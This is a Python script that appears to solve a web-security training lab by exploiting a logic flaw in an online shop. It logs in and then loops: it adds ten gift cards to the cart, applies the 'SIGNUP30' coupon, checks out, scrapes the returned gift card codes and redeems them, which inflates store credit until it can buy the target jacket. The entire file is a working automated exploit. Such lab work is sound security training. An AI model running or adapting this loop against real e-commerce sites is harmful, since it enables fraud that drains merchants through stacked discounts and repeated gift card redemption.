import requests
import sys
import urllib3
from bs4 import BeautifulSoup

proxy = {
    "http" : "http://127.0.0.1:8080",
    "https" : "http://127.0.0.1:8080",
}
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def get_csrf_token (url:str,session:requests.Session):
    print("(+) Extracting the csrf token ...")
    response = session.get(url,verify=False, proxies=proxy)
    soup = BeautifulSoup(response.text,"html.parser")
    csrf_token = soup.find("input" , attrs={"name":"csrf"})["value"]
    print("(+) csrf token is \"%s\" " %csrf_token)
    return csrf_token
def check_current_credit(url:str,session:requests.Session):
        # https://www.crummy.com/software/BeautifulSoup/bs4/doc/#extract

        response = session.get(url,verify=False,proxies=proxy)
        soup = BeautifulSoup(response.text,"html.parser")
     #   print(soup)
        strong_tag = soup.strong.extract()
        strong_tag_content = strong_tag.string.extract()

        #strong_tag_content = soup.find('strong')["value"]
        #strong_tag_content = strong_tag.string.extract()
        my_credit = ''
        for i in strong_tag_content:
            if str.isdecimal(i):
                my_credit += i

        my_credit_int = int(my_credit)
        my_credit_int /=100

        return my_credit_int
def add_product_to_cart(url:str,session:requests.Session,product_id:int,quantity:int):
    cart_url = url+'/cart'
    params = { # productId=2&redir=PRODUCT&quantity=1
         "productId":product_id,
         "redir":"PRODUCT",
         "quantity":quantity
    }
    session.post(cart_url,proxies=proxy,verify=False,data=params)
def check_out(url:str,session:requests.Session , csrf_token:str):
    check_out_url = url+ '/cart/checkout'
    params = {"csrf":csrf_token}
    response= session.post(check_out_url,verify=False,proxies=proxy , data=params)
    if response.status_code == 400 :
        print("(-) Something wend wrong in purchasing the current items in the cart ..")
        return False
    return True
def post_coupon(url:str,session:requests.Session,csrf_token:str):
    print("(+) Applying 'SIGNUP30' Coupon ")
    post_coupon_url = url +'/cart/coupon'
    params = {
            "csrf":csrf_token,
            "coupon":"SIGNUP30"
    }
    session.post(post_coupon_url,verify=False,data=params,proxies=proxy)
def purchase_gift_card(url:str , session:requests.Session,cart_csrf_token:str):
        ("(+) Purchasing Gift Cards ...")
        checkout_url = url + '/cart/checkout'
        params = {"csrf":cart_csrf_token}
        response = session.post(checkout_url , verify=False,proxies=proxy, data= params)
        soup = BeautifulSoup(response.text , "html.parser")
        all_page_text = soup.get_text()
       # print("########")
       # print(all_page_text)
       # print("########")
        list_of_texts = all_page_text.split('\n')
        s = len(list_of_texts)
        i = 0 
        while i < s:
            s = len(list_of_texts)
            if list_of_texts[i]  == "\n" or list_of_texts[i]  == "" or list_of_texts[i]  == " "  :
            
                list_of_texts.pop(i)
                i = 0
            i+=1
        
        print("(+) Codes returned from purching 10 Gift Cards ... \n")
        list_of_codes = []
        counter = 0
        flag = False  
        for j, i   in  enumerate(list_of_texts ) :
            if i == "Code": 
                flag = True
                while counter  < 10 : 
                        list_of_codes.append(list_of_texts[j+1])
                        counter +=1 
                        j+=1
            if flag:
                break
            
        print(f"(+) Current List of Codes = {list_of_codes}")
        # print(list_of_texts[len(list_of_texts)-11:len(list_of_texts) -1])
        return list_of_codes

        #return list_of_texts[len(list_of_texts)-11:len(list_of_texts)-1]
def submite_codes(url :str ,session : requests.Session,csrf_token :str, codes:list):
    submite_code_url = url + '/gift-card'
    for i in codes:
        params = {
            "csrf":csrf_token , 
            "gift-card":i
        }
        session.post(submite_code_url,verify=False , proxies=proxy, data=params)
def purchase_jacket(url:str, session :requests.Session,csrf_token:str  ):
    add_product_to_cart(url,session,1,1)
    return check_out(url,session,csrf_token)
def automate_refund_gift_card(url:str,username:str,passwd:str,session:requests.Session):
    login_url = url +'/login'
    profile_url = url+'/my-account?id=' + username
    cart_url = url +'/cart'
    login_csrf_token = get_csrf_token(login_url,session)
    params = {
        "username":username,
        "password":passwd,
        "csrf":login_csrf_token
    }
    session.post(login_url,verify=False,proxies=proxy,data=params)
    current_credit = int(check_current_credit(profile_url,session))
    print(f"(+) Current Credit = {current_credit}")

    while True: 
        print("(+) Exploiting the infinite Vulnerability ...")
        if int(check_current_credit(profile_url,session)) > 1337:
            break
        print("(+) Adding 10 Gift Cards to Cart ...")
        # add 10 gift card to Cart
        add_product_to_cart(url,session,2,10)
        cart_csrf_token = get_csrf_token(cart_url,session)
        post_coupon(url,session,cart_csrf_token)

        print(f"(+) Current Credit = {int(check_current_credit(profile_url,session))}")
        list_of_codes = purchase_gift_card(url,session,cart_csrf_token)
        submite_codes(url, session,cart_csrf_token,list_of_codes)
    
    
    if purchase_jacket(url,session,cart_csrf_token):
        print("(+) Lab Complited Successfully ...")
    else :
        print("(-) We couldn't purchase the jacket")
        
        
        # my function increase credit 
    #x -># we need to check the current store credit if it > 1337 -> break the process of refunding 
    # while true :
    # if !x :
    # break
def main():

    if len(sys.argv) != 4 :
            print("(-) Something Went wrong !!")
            print (f"(-) Usage {sys.argv[0]} 'url' 'username' 'password")
            print(f"(-) Example: {sys.argv[0]} 'https://example.com' 'username' 'password ")
            sys.exit(-1)
    session  = requests.Session()
    url = sys.argv[1]
    username = sys.argv[2]
    passwd = sys.argv[3]

    automate_refund_gift_card(url,username,passwd,session)


if __name__ == "__main__":
    main()
